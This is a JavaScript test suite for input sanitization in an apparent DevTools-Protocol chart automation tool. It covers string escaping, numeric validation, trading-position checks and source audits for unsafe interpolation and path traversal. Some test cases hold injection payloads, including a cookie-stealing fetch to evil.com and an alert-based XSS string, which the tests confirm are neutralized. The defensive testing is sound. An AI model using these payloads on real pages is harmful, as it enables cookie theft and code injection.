/**
 * Tests for CDP input sanitization utilities and their integration across modules.
 * Covers safeString(), requireFinite(), source audit, and per-module validation.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { safeString, requireFinite } from '../src/connection.js';
import { setSymbol, setTimeframe, setType, manageIndicator, setVisibleRange } from '../src/core/chart.js';
import { drawShape, drawPosition } from '../src/core/drawing.js';

// ── Mock helpers ─────────────────────────────────────────────────────────

function mockEval() {
  const calls = [];
  const fn = async (expr) => { calls.push(expr); return undefined; };
  fn.calls = calls;
  return fn;
}

function mockDeps(overrides = {}) {
  const evaluate = mockEval();
  return {
    _deps: {
      evaluate,
      evaluateAsync: evaluate,
      waitForChartReady: async () => true,
      getChartApi: async () => 'window.__api',
      ...overrides,
    },
    evaluate,
  };
}

// ── safeString() ─────────────────────────────────────────────────────────

describe('safeString() — CDP injection prevention', () => {
  it('wraps normal strings in double quotes', () => {
    assert.equal(safeString('hello'), '"hello"');
  });

  it('wraps in double quotes so single quotes are safe', () => {
    assert.equal(safeString("test'injection"), '"test\'injection"');
  });

  it('escapes double quotes', () => {
    assert.equal(safeString('test"injection'), '"test\\"injection"');
  });

  it('neutralizes template literals by wrapping in double quotes', () => {
    const parsed = JSON.parse(safeString('${alert(1)}'));
    assert.equal(parsed, '${alert(1)}');
  });

  it('escapes backslashes', () => {
    assert.equal(safeString('test\\injection'), '"test\\\\injection"');
  });

  it('escapes newlines and control chars', () => {
    const result = safeString('line1\nline2\r\ttab');
    assert.ok(!result.includes('\n'));
    assert.ok(result.includes('\\n'));
  });

  it('handles empty string', () => {
    assert.equal(safeString(''), '""');
  });

  it('coerces non-strings to strings', () => {
    assert.equal(safeString(123), '"123"');
    assert.equal(safeString(null), '"null"');
    assert.equal(safeString(undefined), '"undefined"');
  });

  it('prevents classic CDP injection payload', () => {
    const payload = "'); fetch('https://evil.com/steal?c=' + document.cookie); ('";
    const parsed = JSON.parse(safeString(payload));
    assert.equal(parsed, payload);
  });

  it('prevents template literal injection', () => {
    const payload = '`; process.exit(); `';
    const parsed = JSON.parse(safeString(payload));
    assert.equal(parsed, payload);
  });
});

// ── requireFinite() ──────────────────────────────────────────────────────

describe('requireFinite() — numeric validation', () => {
  it('passes finite numbers through', () => {
    assert.equal(requireFinite(42, 'test'), 42);
    assert.equal(requireFinite(3.14, 'test'), 3.14);
    assert.equal(requireFinite(-100, 'test'), -100);
    assert.equal(requireFinite(0, 'test'), 0);
  });

  it('coerces numeric strings', () => {
    assert.equal(requireFinite('42', 'test'), 42);
  });

  it('rejects NaN', () => {
    assert.throws(() => requireFinite(NaN, 'price'), /price must be a finite number/);
  });

  it('rejects Infinity', () => {
    assert.throws(() => requireFinite(Infinity, 'time'), /time must be a finite number/);
    assert.throws(() => requireFinite(-Infinity, 'time'), /time must be a finite number/);
  });

  it('rejects non-numeric strings', () => {
    assert.throws(() => requireFinite('abc', 'value'), /value must be a finite number/);
  });

  it('coerces null to 0', () => {
    assert.equal(requireFinite(null, 'x'), 0);
  });

  it('rejects undefined', () => {
    assert.throws(() => requireFinite(undefined, 'x'), /x must be a finite number/);
  });

  it('includes bad value in error message', () => {
    assert.throws(() => requireFinite('oops', 'field'), /got: oops/);
  });
});

// ── chart.js — safeString in evaluate calls ──────────────────────────────

describe('chart.js — sanitized evaluate calls', () => {
  it('setSymbol uses safeString in evaluate', async () => {
    const { _deps, evaluate } = mockDeps();
    await setSymbol({ symbol: "NYMEX:CL1!", _deps });
    const call = evaluate.calls.find(c => c.includes('setSymbol'));
    assert.ok(call, 'setSymbol called');
    assert.ok(call.includes('"NYMEX:CL1!"'), 'symbol wrapped in double quotes via safeString');
    assert.ok(!call.includes("'NYMEX:CL1!'"), 'no single-quoted interpolation');
  });

  it('setSymbol sanitizes injection payload', async () => {
    const { _deps, evaluate } = mockDeps();
    const payload = "'; alert('xss'); //";
    await setSymbol({ symbol: payload, _deps });
    const call = evaluate.calls.find(c => c.includes('setSymbol'));
    // Payload must be wrapped in JSON.stringify output — double-quoted, escaped
    // It should NOT appear as a bare unquoted string that could break out
    assert.ok(call.includes(safeString(payload)), 'payload is JSON-escaped in evaluate call');
    assert.ok(!call.includes(`setSymbol('`), 'no single-quoted interpolation');
  });

  it('setTimeframe uses safeString', async () => {
    const { _deps, evaluate } = mockDeps();
    await setTimeframe({ timeframe: '15', _deps });
    const call = evaluate.calls.find(c => c.includes('setResolution'));
    assert.ok(call.includes('"15"'), 'timeframe wrapped via safeString');
  });

  it('setType validates chart type range 0-9', async () => {
    const { _deps } = mockDeps();
    // Valid names
    for (const name of ['Candles', 'Line', 'Area', 'HeikinAshi']) {
      const r = await setType({ chart_type: name, _deps });
      assert.equal(r.success, true);
    }
    // Valid numbers
    for (const n of [0, 1, 5, 9]) {
      const r = await setType({ chart_type: String(n), _deps });
      assert.equal(r.success, true);
    }
  });

  it('setType rejects invalid chart types', async () => {
    const { _deps } = mockDeps();
    for (const bad of ['invalid', '10', '-1', '1.5', 'NaN']) {
      await assert.rejects(
        () => setType({ chart_type: bad, _deps }),
        /Unknown chart type/,
        `should reject chart_type="${bad}"`,
      );
    }
  });

  it('manageIndicator add uses safeString for indicator name', async () => {
    const { _deps, evaluate } = mockDeps();
    evaluate.calls.length = 0;
    // First evaluate call is getAllStudies (before), then createStudy, then getAllStudies (after)
    const evalFn = async (expr) => {
      evaluate.calls.push(expr);
      if (expr.includes('getAllStudies')) return ['id1'];
      return undefined;
    };
    _deps.evaluate = evalFn;
    await manageIndicator({ action: 'add', indicator: "Relative Strength Index", _deps });
    const createCall = evaluate.calls.find(c => c.includes('createStudy'));
    assert.ok(createCall, 'createStudy called');
    assert.ok(createCall.includes('"Relative Strength Index"'), 'indicator name via safeString');
  });

  it('manageIndicator remove uses safeString for entity_id', async () => {
    const { _deps, evaluate } = mockDeps();
    await manageIndicator({ action: 'remove', entity_id: "abc123", _deps });
    const call = evaluate.calls.find(c => c.includes('removeEntity'));
    assert.ok(call.includes('"abc123"'), 'entity_id via safeString');
  });

  it('setVisibleRange validates from/to with requireFinite', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => setVisibleRange({ from: NaN, to: 100, _deps }),
      /from must be a finite number/,
    );
    await assert.rejects(
      () => setVisibleRange({ from: 100, to: Infinity, _deps }),
      /to must be a finite number/,
    );
  });

  it('setVisibleRange passes valid numbers to evaluate', async () => {
    const { _deps, evaluate } = mockDeps();
    await setVisibleRange({ from: 1700000000, to: 1700100000, _deps });
    const call = evaluate.calls.find(c => c.includes('zoomToBarsRange'));
    assert.ok(call, 'zoomToBarsRange called');
    assert.ok(call.includes('1700000000'), 'from value in call');
    assert.ok(call.includes('1700100000'), 'to value in call');
  });
});

// ── drawing.js — safeString + requireFinite ──────────────────────────────

describe('drawing.js — sanitized evaluate calls', () => {
  it('drawShape validates point coordinates with requireFinite', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawShape({ shape: 'horizontal_line', point: { time: NaN, price: 100 }, _deps }),
      /point\.time must be a finite number/,
    );
    await assert.rejects(
      () => drawShape({ shape: 'horizontal_line', point: { time: 100, price: Infinity }, _deps }),
      /point\.price must be a finite number/,
    );
  });

  it('drawShape validates point2 coordinates', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawShape({
        shape: 'trend_line',
        point: { time: 100, price: 50 },
        point2: { time: NaN, price: 60 },
        _deps,
      }),
      /point2\.time must be a finite number/,
    );
  });

  it('drawShape uses safeString for shape name', async () => {
    const { _deps, evaluate } = mockDeps();
    await drawShape({ shape: 'horizontal_line', point: { time: 100, price: 50 }, _deps });
    const call = evaluate.calls.find(c => c.includes('createShape'));
    assert.ok(call, 'createShape called');
    assert.ok(call.includes('"horizontal_line"'), 'shape name via safeString');
  });

  it('drawShape uses validated coordinates in evaluate', async () => {
    const { _deps, evaluate } = mockDeps();
    await drawShape({ shape: 'horizontal_line', point: { time: 1700000000, price: 5000.50 }, _deps });
    const call = evaluate.calls.find(c => c.includes('createShape'));
    assert.ok(call.includes('1700000000'), 'time in call');
    assert.ok(call.includes('5000.5'), 'price in call');
  });

  it('drawShape multipoint uses safeString and requireFinite', async () => {
    const { _deps, evaluate } = mockDeps();
    await drawShape({
      shape: 'trend_line',
      point: { time: 100, price: 50 },
      point2: { time: 200, price: 60 },
      _deps,
    });
    const call = evaluate.calls.find(c => c.includes('createMultipointShape'));
    assert.ok(call, 'createMultipointShape called');
    assert.ok(call.includes('"trend_line"'), 'shape name via safeString');
  });
});

// ── drawing.js — drawPosition validation ────────────────────────────────

describe('drawing.js — drawPosition validation', () => {
  it('rejects long with stop_loss >= entry_price', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawPosition({ direction: 'long', entry_price: 100, stop_loss: 100, take_profit: 110, _deps }),
      /long position: stop_loss must be below entry_price/,
    );
    await assert.rejects(
      () => drawPosition({ direction: 'long', entry_price: 100, stop_loss: 105, take_profit: 110, _deps }),
      /long position: stop_loss must be below entry_price/,
    );
  });

  it('rejects long with take_profit <= entry_price', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawPosition({ direction: 'long', entry_price: 100, stop_loss: 90, take_profit: 100, _deps }),
      /long position: take_profit must be above entry_price/,
    );
    await assert.rejects(
      () => drawPosition({ direction: 'long', entry_price: 100, stop_loss: 90, take_profit: 95, _deps }),
      /long position: take_profit must be above entry_price/,
    );
  });

  it('rejects short with stop_loss <= entry_price', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawPosition({ direction: 'short', entry_price: 100, stop_loss: 100, take_profit: 90, _deps }),
      /short position: stop_loss must be above entry_price/,
    );
    await assert.rejects(
      () => drawPosition({ direction: 'short', entry_price: 100, stop_loss: 95, take_profit: 90, _deps }),
      /short position: stop_loss must be above entry_price/,
    );
  });

  it('rejects short with take_profit >= entry_price', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawPosition({ direction: 'short', entry_price: 100, stop_loss: 110, take_profit: 100, _deps }),
      /short position: take_profit must be below entry_price/,
    );
    await assert.rejects(
      () => drawPosition({ direction: 'short', entry_price: 100, stop_loss: 110, take_profit: 105, _deps }),
      /short position: take_profit must be below entry_price/,
    );
  });

  it('rejects invalid direction', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawPosition({ direction: 'up', entry_price: 100, stop_loss: 90, take_profit: 110, _deps }),
      /direction must be "long" or "short"/,
    );
    await assert.rejects(
      () => drawPosition({ direction: undefined, entry_price: 100, stop_loss: 90, take_profit: 110, _deps }),
      /direction must be "long" or "short"/,
    );
  });

  it('rejects NaN entry_price', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawPosition({ direction: 'long', entry_price: NaN, stop_loss: 90, take_profit: 110, _deps }),
      /entry_price must be a finite number/,
    );
  });

  it('rejects Infinity stop_loss', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawPosition({ direction: 'long', entry_price: 100, stop_loss: Infinity, take_profit: 110, _deps }),
      /stop_loss must be a finite number/,
    );
  });

  it('rejects undefined take_profit', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawPosition({ direction: 'long', entry_price: 100, stop_loss: 90, take_profit: undefined, _deps }),
      /take_profit must be a finite number/,
    );
  });

  function makeEvalFn() {
    const calls = [];
    const fn = async (expr) => {
      calls.push(expr);
      if (expr.includes('pricescale')) return 100000;
      if (expr.includes('getVisibleRange')) return { to: 1700000000 };
      if (expr.includes('getAllShapes')) return ['existing1'];
      return undefined;
    };
    fn.calls = calls;
    return fn;
  }

  it('creates long_position shape with correct createShape call', async () => {
    const evalFn = makeEvalFn();
    const _deps = {
      evaluate: evalFn,
      getChartApi: async () => 'window.__api',
    };
    const result = await drawPosition({
      direction: 'long',
      entry_price: 100,
      stop_loss: 90,
      take_profit: 120,
      _deps,
    });
    assert.equal(result.success, true);
    assert.equal(result.direction, 'long');
    const createCall = evalFn.calls.find(c => c.includes('createShape'));
    assert.ok(createCall, 'createShape was called');
    assert.ok(createCall.includes('"long_position"'), 'shape name is long_position');
    assert.ok(createCall.includes('stopLevel'), 'overrides contain stopLevel');
    assert.ok(createCall.includes('profitLevel'), 'overrides contain profitLevel');
  });

  it('creates short_position shape', async () => {
    const evalFn = makeEvalFn();
    const _deps = {
      evaluate: evalFn,
      getChartApi: async () => 'window.__api',
    };
    const result = await drawPosition({
      direction: 'short',
      entry_price: 100,
      stop_loss: 110,
      take_profit: 80,
      _deps,
    });
    assert.equal(result.success, true);
    assert.equal(result.direction, 'short');
    const createCall = evalFn.calls.find(c => c.includes('createShape'));
    assert.ok(createCall.includes('"short_position"'), 'shape name is short_position');
  });

  it('passes optional overrides when provided', async () => {
    const evalFn = makeEvalFn();
    const _deps = {
      evaluate: evalFn,
      getChartApi: async () => 'window.__api',
    };
    await drawPosition({
      direction: 'long',
      entry_price: 100,
      stop_loss: 90,
      take_profit: 120,
      account_size: 10000,
      risk: 1,
      lot_size: 0.5,
      _deps,
    });
    const createCall = evalFn.calls.find(c => c.includes('createShape'));
    assert.ok(createCall.includes('accountSize'), 'overrides contain accountSize');
    assert.ok(createCall.includes('risk'), 'overrides contain risk');
    assert.ok(createCall.includes('lotSize'), 'overrides contain lotSize');
  });

  it('skips getVisibleRange when entry_time is provided', async () => {
    const evalFn = makeEvalFn();
    const _deps = {
      evaluate: evalFn,
      getChartApi: async () => 'window.__api',
    };
    await drawPosition({
      direction: 'long',
      entry_price: 100,
      stop_loss: 90,
      take_profit: 120,
      entry_time: 1700000000,
      _deps,
    });
    const rangeCall = evalFn.calls.find(c => c.includes('getVisibleRange'));
    assert.equal(rangeCall, undefined, 'getVisibleRange was not called');
    const createCall = evalFn.calls.find(c => c.includes('createShape'));
    assert.ok(createCall.includes('1700000000'), 'entry_time used in createShape');
  });
});

// ── Source-level audit ───────────────────────────────────────────────────

describe('source audit — no unsafe interpolation patterns', () => {
  const CORE_DIR = new URL('../src/core/', import.meta.url).pathname;
  const coreFiles = readdirSync(CORE_DIR).filter(f => f.endsWith('.js'));

  for (const file of coreFiles) {
    it(`${file} has no .replace(/'/g) manual escaping`, () => {
      const source = readFileSync(join(CORE_DIR, file), 'utf8');
      assert.ok(!source.includes(".replace(/'/g,"),
        `${file} still uses manual quote escaping — use safeString() instead`);
    });
  }

  const VULNERABLE_PATTERNS = [
    /evaluate\([^)]*'\$\{(?!CHART_API|CWC|rp|apiPath|colPath|CHART_COLLECTION)/,
  ];

  for (const file of coreFiles) {
    it(`${file} has no raw user input in evaluate() string literals`, () => {
      const source = readFileSync(join(CORE_DIR, file), 'utf8');
      for (const pattern of VULNERABLE_PATTERNS) {
        assert.ok(!pattern.test(source),
          `${file} has raw interpolation in evaluate() — use safeString()`);
      }
    });
  }
});

// ── Path traversal prevention ────────────────────────────────────────────

describe('path traversal prevention', () => {
  it('capture.js strips path separators from filename', () => {
    const source = readFileSync(new URL('../src/core/capture.js', import.meta.url), 'utf8');
    assert.ok(source.includes(".replace(/[\\/\\\\]/g, '_')"));
  });

  it('batch.js strips path separators from filename', () => {
    const source = readFileSync(new URL('../src/core/batch.js', import.meta.url), 'utf8');
    assert.ok(source.includes(".replace(/[\\/\\\\]/g, '_')"));
  });
});
